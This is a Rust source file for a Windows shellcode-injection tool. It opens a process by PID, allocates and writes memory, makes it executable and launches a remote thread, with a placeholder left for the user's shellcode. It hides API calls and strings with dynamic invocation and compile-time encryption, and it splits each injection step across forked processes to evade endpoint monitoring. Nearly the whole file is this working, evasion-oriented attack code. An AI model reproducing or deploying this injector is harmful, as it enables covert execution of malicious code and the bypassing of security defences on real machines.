#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use litcrypt::lc;
use bindings::Windows::Win32::Foundation::HANDLE;
use bindings::Windows::Win32::System::WindowsProgramming::{OBJECT_ATTRIBUTES, CLIENT_ID};
use data::{ PS_CREATE_INFO, PVOID, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ };
use std::ffi::c_void;
use std::mem::{transmute, size_of};
use std::ptr::{self};
use std::env;

// These two could be local variables as well
static mut PHANDLE: HANDLE = HANDLE {0 : 0};
static mut BASE_ADDRESS: usize = 0usize;

// Replace this with your shellcode
static SHELLCODE: &str

fn main() {
    #![allow(invalid_reference_casting)]
    unsafe 
    {

        let args: Vec<String> = env::args().collect();

        if args.len() < 2 || args[1] == "-h" || args[1] == "--help"
        {
            print_help();
            return;
        } 

        let process_id = args[1].parse::<i32>().unwrap() as isize;
        let handle_ptr: *mut HANDLE = std::mem::transmute(&PHANDLE);
        let mut o = OBJECT_ATTRIBUTES::default();
        o.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
        o.Attributes = 0x00000002; // OBJ_INHERIT 
        let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&o);
        let client_id = CLIENT_ID {UniqueProcess: HANDLE{0:process_id as isize}, UniqueThread: HANDLE::default()};
        let client_id: *mut CLIENT_ID = std::mem::transmute(&client_id);
       
        let r = dinvoke::nt_open_process(
            handle_ptr,
            0x0008 | 0x0020 | 0x0002, // PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD 
            object_attributes,
            client_id
        );

        if r != 0
        {
            return;
        }
        
        // Remove all these if statements in order to obtain the PoC without the fork mechanism
        if fork() == 0
        {
           return;
        }

        let a = usize::default();
        let base_address: *mut PVOID = std::mem::transmute(&a);
        let zero_bits = 0 as usize;
        let decoded =  hex::decode(SHELLCODE).expect("");
        let dwsize = decoded.len();
        let size: *mut usize = std::mem::transmute(&dwsize);
        let ret = dinvoke::nt_allocate_virtual_memory(
            PHANDLE, 
            base_address, 
            zero_bits, 
            size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE);
        
        if ret == 0
        {
            BASE_ADDRESS = *base_address as usize;
        }
        else
        {     
            return;
        }

        if fork() == 0
        {
           return;
        }

        let base_address: *mut c_void = std::mem::transmute(BASE_ADDRESS);
        let written: usize = 0;
        let buffer: *mut c_void = std::mem::transmute(decoded.as_ptr());
        let nsize = dwsize;
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_write_virtual_memory(
            PHANDLE, 
            base_address, 
            buffer, 
            nsize, 
            bytes_written);

        if ret != 0
        {
            return;
        }

        if fork() == 0
        {
           return;
        }

        let base_address: *mut PVOID = std::mem::transmute(&BASE_ADDRESS);
        let s = isize::default();
        let size: *mut usize = std::mem::transmute(&s);
        *size = dwsize;
        let old_protection: *mut u32 = std::mem::transmute(&u32::default());
        let ret = dinvoke::nt_protect_virtual_memory(
            PHANDLE, 
            base_address, 
            size, 
            PAGE_EXECUTE_READ, 
            old_protection);

        if ret != 0
        {
            return;
        }

        if fork() == 0
        {
           return;
        } 

        let f: data::NtCreateThreadEx;
        let _r: Option<i32>;
        let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
        let hand: *mut HANDLE = std::mem::transmute(&HANDLE::default());
        let start_routine: PVOID = std::mem::transmute(BASE_ADDRESS);
        dinvoke::dynamic_invoke!(ntdll,&lc!("NtCreateThreadEx"),f,_r,hand,0x1FFFFF,ptr::null_mut(),PHANDLE,start_routine,ptr::null_mut(),0,0,0,0,ptr::null_mut());

        dinvoke::close_handle(PHANDLE);

    }
}

fn print_help() {
    
    let help = lc!("
    USAGE:
        split.exe [OPTIONS] <PID>
    ARGS:
        <PID>                       Remote Process ID.
    OPTIONS:
        -h, --help                  Print help information.
    ");
    
        println!("{}", help);
}

fn fork() -> i32
{
    unsafe
    {
        let p = HANDLE::default();
        let t = HANDLE::default();
        let process: *mut HANDLE = transmute(&p);
        let thread: *mut HANDLE = transmute(&t);
        let mut create_info: PS_CREATE_INFO = std::mem::zeroed();
        create_info.size = size_of::<PS_CREATE_INFO>();
        let ps_create_info: *mut PS_CREATE_INFO = transmute(&create_info);
       
        let ret = dinvoke::nt_create_user_process(
            process,  // NULL
            thread,  // NULL
            (0x000F0000) |  (0x00100000) | 0xFFFF, //PROCESS_ALL_ACCESS
            (0x000F0000) |  (0x00100000) | 0xFFFF, //THREAD_ALL_ACCESS
            ptr::null_mut(), 
            ptr::null_mut(), 
            0x00000004, //PROCESS_CREATE_FLAGS_INHERIT_FROM_PARENT
            0, 
            ptr::null_mut(), 
            ps_create_info, // Default PS_CREATE_INFO struct
            ptr::null_mut()
        );

        ret
    }

}
